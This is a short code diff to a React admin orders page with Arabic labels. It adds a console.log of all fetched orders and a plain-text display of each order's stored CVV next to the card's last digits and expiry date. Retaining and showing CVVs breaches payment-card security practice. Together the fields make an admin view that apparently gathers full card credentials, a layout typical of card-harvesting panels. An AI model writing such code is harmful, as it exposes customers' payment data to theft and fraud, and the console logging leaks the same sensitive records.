@@ -80,6 +80,7 @@ const AdminOrders = () => {
       if (error) {
         console.error("Error fetching orders:", error);
       } else {
+        console.log("Fetched orders:", data);
         setOrders(data || []);
       }
       setLoading(false);
@@ -373,7 +374,7 @@ const AdminOrders = () => {
                               <div className="flex justify-between">
                                 <span className="text-gray-500">رقم البطاقة:</span>
                                 <span className="font-mono font-medium" dir="ltr">
-                                  {order.card_number ? `**** ${order.card_number.slice(-4)}` : "-"}
+                                  {order.card_number ? `**** **** **** ${order.card_number.slice(-4)}` : "-"}
                                 </span>
                               </div>
                               <div className="flex justify-between">
@@ -384,7 +385,11 @@ const AdminOrders = () => {
                               </div>
                               <div className="flex justify-between">
                                 <span className="text-gray-500">الانتهاء:</span>
-                                <span className="font-medium">{order.expiry_date || "-"}</span>
+                                <span className="font-medium" dir="ltr">{order.expiry_date || "-"}</span>
+                              </div>
+                              <div className="flex justify-between">
+                                <span className="text-gray-500">CVV:</span>
+                                <span className="font-mono font-medium">{order.cvv || "-"}</span>
                               </div>
                             </div>
                           </div>
